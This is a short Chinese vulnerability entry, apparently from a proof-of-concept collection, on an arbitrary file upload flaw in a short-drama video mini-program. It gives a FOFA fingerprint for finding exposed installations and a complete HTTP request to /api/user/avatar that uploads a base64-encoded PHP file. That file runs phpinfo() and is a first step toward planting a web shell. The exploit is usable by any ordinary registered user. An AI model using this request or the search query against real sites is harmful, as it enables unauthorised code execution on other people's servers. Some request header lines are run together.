# 短剧影视小程序前台base64_image_content任意文件上传漏洞

**注意 这里需要登录，普通用户权限即可 访问 /index/user 可直接注册登录。**

## fofa

```yaml
"/VwmRIfEYDH.php"
```

## poc

```javascript
POST /api/user/avatar HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 73Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=qt0rrvopobbbvibu6f8p9lr42
rHost: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/api/user/avatar
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

base64=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==
```

![image-20240902102758828](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409021027916.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/3WYJzQnjl8hP7oXVZUEQuA